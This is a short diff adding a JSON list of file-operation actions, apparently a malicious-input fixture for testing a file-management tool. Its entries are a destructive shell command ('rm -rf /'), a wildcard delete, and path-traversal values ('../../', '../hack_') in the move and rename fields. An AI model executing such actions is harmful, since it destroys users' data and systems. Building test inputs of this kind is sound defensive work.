@@ -1,0 +1,6 @@
+[
+  {"action": "move", "src": "*.pdf", "dst": "../../"},
+  {"action": "delete", "path": "*"},
+  {"action": "shell", "command": "rm -rf /"},
+  {"action": "rename_prefix", "pattern": "*.txt", "prefix": "../hack_"}
+]
